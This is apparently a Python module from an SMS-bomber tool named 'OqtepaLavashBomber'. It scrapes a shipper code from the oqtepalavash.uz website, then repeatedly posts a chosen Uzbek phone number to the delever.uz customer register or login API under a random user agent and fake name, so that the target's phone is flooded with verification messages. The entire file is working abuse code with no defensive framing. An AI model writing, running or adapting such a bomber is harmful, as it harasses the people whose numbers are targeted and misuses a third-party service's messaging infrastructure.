import requests, lxml
from bs4 import BeautifulSoup

import time
import random

import re

from .utils import (random_user_agent, random_names)
from .utils import FormattingOptions

fo = FormattingOptions()

class OqtepaLavashBomber:
    def __init__(self, session: requests.Session) -> None:
        self.sess = session
        self.main_url = "https://customer.api.delever.uz/v1/customers/"
        self.shipper_code = ''
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uz;q=0.6',
            'Connection': 'keep-alive',
            'Host': 'customer.api.delever.uz',
            'User-Agent': random_user_agent(),
            'Shipper': ''
        }
        self.data = {
            'name': random_names(),
            'phone': None
        }

    def _shipper_code(self, soup: BeautifulSoup) -> str:
        l = [i.get('src') for i in soup.find_all('script') if i.get('src')]
        filtered = filter(lambda m: 'main' in m, l)
        filtered = list(filtered)
        url = filtered[0] if list(filtered) else 'none'

        if url == 'none':
            return '36b00947-ad7a-40eb-b7ca-1c0ea267f2ac'

        r = self.sess.get('https://oqtepalavash.uz' + url)
        pattern = re.findall(r'this._shipper = "[^"]+"', r.text)
        if not pattern:
            pattern = re.findall(r'this._shipper="[^"]+"', r.text)
        return str(pattern[0]).split('"')[1].split('"')[0]

    def shipper_code_proccess(self):
        url_for_shipper_code = 'https://oqtepalavash.uz/'
        response = self.sess.get(url_for_shipper_code)
        soup = BeautifulSoup(response.content, 'lxml')
        self.shipper_code = self._shipper_code(soup)
        self.headers['Shipper'] = self.shipper_code

    def _is_already_exists(self, url) -> bool:
        r = self.sess.post(
            url=url,
            json=self.data,
            headers=self.headers
        ).json()
        if 'Error' not in r:
            return False
        else:
            if r['Error']['code'] == 'ALREADY_EXISTS':
                return True
            else:
                return False

    def start_bombing(self, phone: str, amount: int = 1):
        self.shipper_code_proccess()
        self.data['phone'] = f'+998{phone}'
        url = self.main_url + 'register'
        exists = self._is_already_exists(url)

        if exists:
            url = self.main_url + 'login'

        print(fo._(fo.BOLD, "\nTo'xtatish uchun: [Ctrl]+[C]"))
        
        for s in range(1, amount + 1):
            r = self.sess.post(
                url=url,
                json=self.data,
                headers=self.headers
            ).json()

            if 'Error' not in r:
                print(f"{fo._(fo.BOLD, str(s)+'|')} {fo._(fo.OKGREEN, 'Muvaffaqiyatli!')}")
            else:
                print(f'{0}Xatolik: {1}{2}'.format(fo.FAIL, r['Error']['message']), fo.ENDC)
                break

            time.sleep(random.choice([1, 2, 0.5]))
        else:
            print(fo._(fo.BOLD, '\nTugadi :)\n'))
